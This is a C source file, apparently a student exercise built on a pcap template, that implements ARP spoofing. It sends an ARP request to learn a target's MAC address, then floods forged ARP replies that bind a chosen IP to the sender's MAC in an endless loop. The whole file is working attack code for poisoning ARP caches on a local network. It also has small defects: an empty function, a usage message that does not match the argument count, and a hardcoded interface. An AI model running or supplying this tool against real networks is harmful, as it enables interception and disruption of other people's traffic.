#include <pcap.h>
#include <stdio.h>
#include <string.h>	//strncpy
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>	//ifreq
#include <unistd.h>	//close
#include <stdlib.h>
#include <arpa/inet.h>

#define INTERFACE "ens33"
#define MAC_LEN 6
#define IP_LEN 4

typedef struct _arp_spoofing_header{

    u_int8_t Dst_Mac[MAC_LEN];
    u_int8_t Src_Mac[MAC_LEN];
    u_int16_t Eth_Type;

    u_int16_t HW_Type;
    u_int16_t Proto_Type;
    u_int8_t HW_Len;
    u_int8_t Proto_Len;

    u_int16_t Operation;

    u_int8_t Sender_Mac[MAC_LEN];
    u_int8_t Sender_Ip[IP_LEN];

    u_int8_t Target_Mac[MAC_LEN];
    u_int8_t Target_Ip[IP_LEN];

}arp_spoofing_header;

void Set_Arp_Request(arp_spoofing_header * arp_request){

    //Broadcast FF-FF-FF-FF-FF-FF
    //Target_Mac 00-00-00-00-00-00

    arp_request->Eth_Type = htons(0x0806);
    arp_request->HW_Type = htons(0x0001);
    arp_request->Proto_Type = htons(0x0800);
    arp_request->HW_Len = 0x06;
    arp_request->Proto_Len = 0x04;
    arp_request->Operation = htons(0x0001);

    for(int i =0; i < 6; i++)
    {
        arp_request->Dst_Mac[i] = 0xFF;
        arp_request->Target_Mac[i] = 0x00;
    }
}

void Set_My_Mac(arp_spoofing_header * arp_mac){

    int fd;
    struct ifreq ifr;
    char iface[] = INTERFACE;
    unsigned char * mac;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);

    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

    //set local mac address!

    for(int i = 0; i < 6; i++)
    {
        arp_mac->Src_Mac[i] = mac[i];
        arp_mac->Sender_Mac[i] = mac[i];
    }
}
void Set_My_Ip(arp_spoofing_header * arp_ip){

      int n;
      int i = 0;
      struct ifreq ifr2;
      char array[] = INTERFACE;
      unsigned char * ip;

      n = socket(AF_INET, SOCK_DGRAM, 0);

      ifr2.ifr_addr.sa_family = AF_INET;

      strncpy(ifr2.ifr_name , array , IFNAMSIZ - 1);
      ioctl(n, SIOCGIFADDR, &ifr2);

      close(n);

      ip = (unsigned char *)inet_ntoa(( (struct sockaddr_in *)&ifr2.ifr_addr )->sin_addr);

      //Remove dot and split
      //Ex)192.168.0.1 ->  192 168 0 1
      char * ptr = strtok((char*)ip,".");
      while(ptr != NULL)
      {
          arp_ip->Sender_Ip[i] = atoi(ptr);
          ptr = strtok(NULL,".");
          i++;
      }
}

void Set_Target_Ip(arp_spoofing_header * arp_target, char * target_ip){

    char * ptr = strtok(target_ip, ".");
    int i = 0;

    while(ptr != NULL)
    {
        arp_target->Target_Ip[i] = atoi(ptr);
        ptr = strtok(NULL, ".");
        i++;
    }
}

void Set_Sender_Ip(arp_spoofing_header * arp_sender, char * target_ip){
    char * ptr = strtok(target_ip, ".");
    int i = 0;

    while(ptr != NULL)
    {
        arp_sender->Sender_Ip[i] = atoi(ptr);
        ptr = strtok(NULL, ".");
        i++;
    }
}

u_char * Exchange_IP(u_char * ip){

}

void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

    u_char sendpacket[60];
    arp_spoofing_header arp_request_header;
    u_char * buf = &arp_request_header;

    //
    Set_Arp_Request(&arp_request_header);
    Set_My_Mac(&arp_request_header);
    Set_My_Ip(&arp_request_header);
    Set_Target_Ip(&arp_request_header, argv[2]);

    for(int i = 0; i < sizeof(arp_request_header); i++)
        sendpacket[i] = *(buf + i);

  while (1) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    //printf("%u bytes captured\n", header->caplen);

    arp_spoofing_header * arp_reply_header = (arp_spoofing_header *)packet;


    //1. Arp request to get sender mac address
    //2. Arp reply to spoof
    pcap_sendpacket(handle,sendpacket, 60);
    printf("Arp_request success!!\n");


    //if arp reply packet(sender mac address) was taken to me
    if(arp_reply_header->Operation == htons(0x0002))
    {
            arp_request_header.Operation = htons(0x0002);
            Set_Sender_Ip(&arp_request_header, argv[3]);

            for(int i = 0; i < MAC_LEN; i++)
            {
                arp_request_header.Dst_Mac[i] = arp_reply_header->Src_Mac[i];
                arp_request_header.Target_Mac[i] = arp_reply_header->Src_Mac[i];
            }

            // Setting arp reply packet to spoof
            for(int i = 0; i < sizeof(arp_request_header); i++)
                 sendpacket[i] = *(buf + i);

            while(1)
            {
                pcap_sendpacket(handle,sendpacket, 60);
                printf("Arp spoofing!!\n");
            }
    }
  }
  pcap_close(handle);
  return 0;
}
